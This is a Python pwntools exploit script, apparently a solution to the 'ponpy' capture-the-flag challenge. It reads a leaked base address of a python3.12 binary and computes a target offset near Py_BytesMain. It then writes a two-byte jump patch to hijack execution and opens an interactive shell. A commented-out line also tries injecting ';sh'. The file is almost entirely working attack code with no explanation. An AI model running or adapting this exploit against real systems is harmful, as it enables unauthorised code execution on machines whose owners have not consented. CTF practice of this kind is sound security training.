#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./python3.12/bin/python3.12')
libc = elf.libc

#p = remote("ponpy.ctfz.zone", 21337)
p = remote("127.0.0.1", 21337)
assert p

p.recvuntil(b'is ')
elf.address = int(p.recvline(), 16)
info(f"elf @ {hex(elf.address)}")

#print(elf.got)
#target_free_plt = elf.address + 0x10067a
#target_free_plt = elf.plt.close
target_free_plt = elf.sym.Py_BytesMain + 107

print(hex(target_free_plt))

p.sendlineafter(b'off: ', hex(target_free_plt).encode())
#p.sendlineafter(b'loot: ', b'\xba\xbb' + b';sh')
#p.sendlineafter(b'loot: ', p32(0x41414141))

p.sendlineafter(b'loot: ', b"\xeb\xec")


p.interactive()
